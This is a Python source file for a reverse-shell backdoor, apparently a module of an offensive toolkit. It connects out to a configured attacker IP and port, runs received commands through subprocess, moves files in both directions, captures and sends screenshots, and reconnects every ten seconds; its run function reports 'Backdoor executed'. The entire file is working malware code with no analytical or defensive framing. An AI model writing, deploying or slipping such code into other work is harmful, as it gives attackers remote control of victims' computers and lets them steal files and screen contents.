import socket
import subprocess
import os
from time import sleep
from pyautogui import screenshot

def reverse_shell(attacker_ip, attacker_port):


    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((attacker_ip, attacker_port))
            while True:
                command = s.recv(1024)
                command = command.decode()

                if command == "":
                    break
                elif command == "exit":
                    s.close()
                    return
                elif command.startswith("upload"):
                    x, filename = command.split(' ', 1)
                    filename = filename.strip()
                    upload_file(s, filename)
                elif command.startswith("download"):
                    x, filename = command.split(' ', 1)
                    filename = filename.strip()
                    print(filename)
                    download_file(s, filename)
                elif command.startswith("screenshot"):
                    take_screenshot(s, "image.png")
                else:
                    output = subprocess.getoutput(command)
                    if output:
                        s.send((output + '\n').encode())

        except (socket.error, BrokenPipeError) as e:
            print(f"[ERROR] Connection lost: {e}. Retrying in 10 seconds.")
            s.close()
            sleep(10)


def upload_file(conn, filename):
    try:
        file = open(filename, "wb")
        while True:
            data = conn.recv(1024)
            if data.strip() == b'END':
                print("[DEBUG] Upload finished.")
                break
            file.write(data)
        file.close()
        
        conn.send(b"Upload complete\n")

    except Exception as e:
        conn.send(f"Upload failed: {e}\n".encode())
        print(f"[ERROR] Upload failed: {e}")




def download_file(conn, filepath):
    normalized_path = os.path.normpath(filepath)

    try:
        if os.path.exists(normalized_path):
            file = open(normalized_path, "rb")
            conn.sendall(file.read())
            file.close()
        else:
            conn.send(b"File not found")
    except Exception as e:
        conn.send(f"Download failed: {e}\n".encode())
        print(f"[ERROR] Download failed: {e}")



def take_screenshot(conn, filename):
    try:
        screenshot(filename)
        file = open(filename, 'rb')
        conn.sendall(file.read())
        file.close()
        os.remove(filename)
        conn.send(b"Screenshot captured and sent\n")
    except Exception as e:
        conn.send(f"Screenshot failed: {e}\n".encode())
        print(f"[ERROR] Screenshot failed: {e}")


def run(config):
    attacker_ip = config.get("attacker_ip")
    attacker_port = config.get("attacker_port")

    if not attacker_ip or not attacker_port:
        print("[ERROR] missing necessary params")
        return {"status": "error", "message": "Missing config for attacker_ip or attacker_port"}

    print(f"[INFO] starting backdoor to {attacker_ip}:{attacker_port}...")
    reverse_shell(attacker_ip, attacker_port)
    return {"status": "success", "message": "Backdoor executed"}


if __name__ == "__main__":
    reverse_shell()